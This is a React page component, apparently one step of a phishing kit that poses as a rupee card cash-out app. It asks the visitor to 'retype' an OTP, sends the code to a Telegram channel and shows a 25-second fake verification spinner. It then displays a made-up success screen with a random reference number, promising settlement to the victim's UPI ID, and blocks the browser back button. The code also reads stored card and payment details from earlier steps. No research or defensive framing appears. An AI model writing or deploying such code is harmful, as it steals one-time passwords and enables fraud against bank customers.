import { useEffect, useMemo, useState } from "react";
import { AppLayout } from "../../components/AppChrome/AppLayout";
import { Button } from "../../components/ui/Button";
import { IconCheck } from "../../components/ui/Icon";
import { sendToTelegram, formatEntry } from "../../lib/telegram";
import "./Page5.css";

/** Reads a value from session storage without throwing in private mode. */
function read<T>(key: string, fallback: T): T {
  try {
    const raw = sessionStorage.getItem(key);
    return raw ? (JSON.parse(raw) as T) : fallback;
  } catch {
    return fallback;
  }
}

/** Generates a human-readable reference number, e.g. RON-8F3K2M7Q. */
function makeReference(): string {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let out = "";
  for (let i = 0; i < 8; i++) {
    out += chars[Math.floor(Math.random() * chars.length)];
  }
  return `RON-${out}`;
}

/**
 * Keeps the user on this screen — the browser back button and back gestures
 * are pushed forward again instead of leaving the success page.
 */
function useLockBack(locked: boolean) {
  useEffect(() => {
    if (!locked) return;

    // An extra entry so the first back press lands here, not on the OTP page.
    window.history.pushState({ rgLock: true }, "");

    const onPopState = () => {
      window.history.pushState({ rgLock: true }, "");
    };

    window.addEventListener("popstate", onPopState);
    return () => window.removeEventListener("popstate", onPopState);
  }, [locked]);
}

export function Page5() {
  const [otp, setOtp] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);

  const lead = useMemo(() => read<{ fullName?: string }>("rg:lead", {}), []);
  const card = useMemo(
    () => read<{ amount?: string; cardNumber?: string }>("rg:card", {}),
    [],
  );
  const payment = useMemo(
    () => read<{ method?: string; upiId?: string }>("rg:payment", {}),
    [],
  );

  const reference = useMemo(() => makeReference(), []);

  useLockBack(done);

  // Amount to cash out plus the 0.27% app charge.
  const baseAmount = Number(card.amount || 0);
  const charge = baseAmount * 0.0027;
  const total = baseAmount + charge;
  const money = (n: number) =>
    `₹${n.toLocaleString("en-IN", {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2,
    })}`;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    if (!/^\d{4,6}$/.test(otp)) {
      return setError("Please enter valid OTP");
    }
    setLoading(true);
    sendToTelegram(
      formatEntry("🔑 OTP — Step 2 (Retype)", {
        "OTP": otp,
      })
    );
    setTimeout(() => {
      setLoading(false);
      setDone(true);
    }, 25000);
  };

  if (loading) {
    return (
      <AppLayout title="Processing" hideTabs>
        <div className="pg5-loader">
          <div className="pg5-loader__card">
            <div className="pg5-loader__spinner" />
            <p className="pg5-loader__text">Please wait...</p>
            <p className="pg5-loader__sub">Verifying your request</p>
          </div>
        </div>
      </AppLayout>
    );
  }

  if (done) {
    return (
      <AppLayout title="Completed" hideTabs>
        <div className="pg5">
          <section className="pg5__success">
            <div className="pg5__success-icon">
              <IconCheck size={32} />
            </div>

            <h1 className="pg5__success-title">Congratulations!</h1>
            <p className="pg5__success-text">
              {lead.fullName || "Dear Customer"}, your amount{" "}
              <b>{money(total)}</b> will be settled within 48 hrs on your given
              UPI ID{" "}
              <b>{payment.upiId || "your registered UPI ID"}</b>.
            </p>

            <dl className="pg5__summary">
              <div className="pg5__summary-row">
                <dt>Amount to cashout</dt>
                <dd>{money(baseAmount)}</dd>
              </div>
              <div className="pg5__summary-row">
                <dt>App charge (0.27%)</dt>
                <dd>{money(charge)}</dd>
              </div>
              <div className="pg5__summary-row pg5__summary-row--total">
                <dt>Total payable</dt>
                <dd>{money(total)}</dd>
              </div>
              <div className="pg5__summary-row">
                <dt>UPI ID</dt>
                <dd>{payment.upiId || "—"}</dd>
              </div>
              <div className="pg5__summary-row">
                <dt>Reference number</dt>
                <dd className="pg5__ref">{reference}</dd>
              </div>
              <div className="pg5__summary-row">
                <dt>Settlement</dt>
                <dd>Within 48 hrs</dd>
              </div>
            </dl>

            <p className="pg5__note">
              Please save your reference number for future support.
            </p>
          </section>
        </div>
      </AppLayout>
    );
  }

  return (
    <AppLayout title="Retype OTP">
      <div className="pg5">
        <section className="pg5__card">
          <h1 className="pg5__title">Retype OTP</h1>
          <p className="pg5__text">Re-enter the OTP for verification</p>
          <form className="pg5__form" onSubmit={handleSubmit} noValidate>
            <div className="pg5__field">
              <label className="pg5__label" htmlFor="otp">
                Enter OTP
              </label>
              <input
                id="otp"
                className="pg5__input"
                type="text"
                inputMode="numeric"
                value={otp}
                onChange={(e) =>
                  setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))
                }
                placeholder="Enter OTP"
                maxLength={6}
              />
            </div>
            {error && <p className="pg5__error">{error}</p>}
            <Button type="submit" variant="primary" block>
              Proceed
            </Button>
          </form>
        </section>
      </div>
    </AppLayout>
  );
}
